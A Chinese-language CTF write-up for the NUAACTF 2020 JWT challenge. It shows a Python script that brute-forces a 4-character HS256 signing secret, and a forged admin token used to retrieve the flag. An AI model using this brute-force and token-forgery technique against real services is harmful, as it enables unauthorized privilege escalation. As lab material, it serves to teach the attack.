# NUAACTF(2020)-jwt writeup

### 简单介绍

JWT(JSON Web Token)是一种用于身份认证和授权的开放标准，它通过在网络应用间传递被加密的JSON数据来安全地传输信息使得身份验证和授权变得更加简单和安全，JWT对于渗透测试人员而言可能是一种非常吸引人的攻击途径，因为它们不仅是让你获得无限访问权限的关键而且还被视为隐藏了通往以下特权的途径，例如:特权升级、信息泄露、SQLi、XSS、SSRF、RCE、LFI等。

### 基本结构

JWT的结构由三部分组成，分别是Header、Payload和Signature

```
header.payload.signature

<base64(header)>.<base64(payload)>.<signature>
```

### 解题思路：

打开题目地址，经典登录页面：

![web-2.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.1.png)

按照题目描述，jwt肯定要注册账号，这里可以尝试登录下，用户名可以枚举的，有admin账号，猜测应该要伪造admin的jwt来获取flag.

注册root账号：
![web-2.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.2.png)

登录root账号：

![web-2.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.3.png)

果然这里有JWT，

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJvb3QifQ.ky8i6QnQs2Sb2X9sbzwpkAhlfTnmwnpfDP7ou8sVnNU
```

先base64解码看下签名算法：
![web-2.7](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.7.png)

签名算法：HS256，对称加密的，这里可以尝试伪造下JWT，先获取secert:

尝试爆破密钥，网上有很多JWT的爆破工具，这里我们自己写一个python脚本：

```
import hashlib
import hmac
import base64
import itertools

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
before = b"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhbmFvIn0"
after = b"r8MVWvxF0V8QVmMYn8dMdfSUBAkc1f5LosyaOHoSPbU"

for combo in itertools.product(chars, repeat=4):
    secret = ''.join(combo).encode()
    sig = base64.urlsafe_b64encode(hmac.new(secret, before, hashlib.sha256).digest()).rstrip(b'=')
    if sig == after:
        print(f"[+] Found key: {secret.decode()}")
        break
```

可以看到这里我们假定的secert位数为四位，为什么为4位呢？下面列举下1-5位密钥爆破需要的时间：

```
密钥位数	总组合数		单线程（20K/s）		多线程（160K/s）	
1 位		  62			0.003 秒				0.0004 秒	
2 位		  3,844		    0.19 秒				0.02 秒	
3 位		  238,328		11.9 秒				1.5 秒	
4 位		  14,776,336	739 秒(~12分)	       92 秒	
5 位		  916,132,832	45,806 秒(~12.7小时)  5,726秒(~1.6小时)	
```

可以看到，单线程的情况下5位比4位多了一个量级😅😅😅，考虑的解题时间，这里就按少于5位进行爆破的

![web-2.6](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.6.png)

爆破出的密钥：NuAa

JWT在线构造和解构的平台:

https://jwt.io/

伪造admin用户的JWT：

![web-2.4](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.4.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA
```

替换root用户的JWT：

![web-2.5](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-2.5.png)

得到flag
